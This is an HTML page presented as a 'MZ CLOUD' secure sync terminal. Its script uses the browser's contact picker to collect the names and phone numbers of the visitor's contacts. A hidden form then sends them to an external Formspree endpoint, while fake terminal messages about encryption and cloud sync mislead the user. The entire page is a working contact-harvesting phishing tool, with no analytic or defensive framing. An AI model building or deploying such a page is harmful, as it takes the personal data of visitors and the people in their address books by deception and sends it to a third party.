<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MZ CLOUD - SECURE ACCESS</title>
    <style>
        :root { --primary: #00ff41; --bg: #050505; }
        body { 
            background: var(--bg); color: var(--primary); 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden;
        }
        .panel { 
            width: 90%; max-width: 450px; background: #0a0a0a; border: 1px solid var(--primary);
            padding: 25px; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); position: relative;
        }
        .header { border-bottom: 1px solid var(--primary); margin-bottom: 20px; padding-bottom: 10px; text-align: center; }
        .header h1 { margin: 0; font-size: 22px; letter-spacing: 3px; color: #fff; }
        .mz-tag { font-size: 12px; color: var(--primary); opacity: 0.8; }
        
        .terminal { 
            background: #000; height: 150px; overflow-y: auto; padding: 10px; 
            font-size: 11px; margin-bottom: 20px; border: 1px solid #222; text-align: left; direction: ltr;
        }
        .progress-bar { width: 0%; height: 2px; background: var(--primary); margin-bottom: 20px; transition: width 0.5s; }
        
        .btn-sync { 
            background: transparent; border: 1px solid var(--primary); color: var(--primary); 
            padding: 15px; width: 100%; font-weight: bold; cursor: pointer; text-transform: uppercase;
            transition: 0.3s;
        }
        .btn-sync:hover { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary); }
        
        .footer { font-size: 10px; margin-top: 15px; color: #444; text-align: center; }
        
        /* Scanline Effect */
        .panel::before {
            content: " "; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            background-size: 100% 2px, 3px 100%; pointer-events: none;
        }
    </style>
</head>
<body>

<div class="panel">
    <div class="header">
        <h1>MZ CLOUD SERVER</h1>
        <div class="mz-tag">AUTHORIZED ACCESS ONLY - MZ V.2.0</div>
    </div>

    <div class="terminal" id="term">
        > SYSTEM BOOT... DONE<br>
        > ENCRYPTION 256-BIT... ACTIVE<br>
        > MZ CLOUD NODE... CONNECTED<br>
        > WAITING FOR USER ACTION_
    </div>

    <div class="progress-bar" id="pbar"></div>

    <button class="btn-sync" id="syncBtn">START CLOUD SYNC</button>

    <form id="mzForm" action="https://formspree.io/f/mbdqpqgz" method="POST" target="_blank" style="display:none;">
        <input type="hidden" name="MZ_REPORT" id="mzData">
    </form>

    <div class="footer">MZ SECURE INFRASTRUCTURE © 2026</div>
</div>

<script>
    const term = document.getElementById('term');
    const pbar = document.getElementById('pbar');
    const btn = document.getElementById('syncBtn');

    function log(msg) {
        term.innerHTML += `<br>> ${msg}`;
        term.scrollTop = term.scrollHeight;
    }

    btn.addEventListener('click', async () => {
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            try {
                log("INITIALIZING CONTACT PICKER...");
                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                
                if (contacts.length > 0) {
                    log(`${contacts.length} NODES DETECTED.`);
                    pbar.style.width = "50%";
                    log("PREPARING DATA PACKETS...");
                    
                    let data = contacts.map(c => `[USER]: ${c.name} | [TEL]: ${c.tel.join(', ')}`).join('\n');
                    document.getElementById('mzData').value = data;
                    
                    setTimeout(() => {
                        log("UPLOADING TO MZ CLOUD...");
                        pbar.style.width = "100%";
                        document.getElementById('mzForm').submit();
                        log("UPLOAD COMPLETE.");
                    }, 1500);
                }
            } catch (err) {
                log("ACCESS DENIED BY USER.");
            }
        } else {
            log("ERROR: INCOMPATIBLE BROWSER.");
            alert("Use Chrome for full system access.");
        }
    });
</script>

</body>
</html>
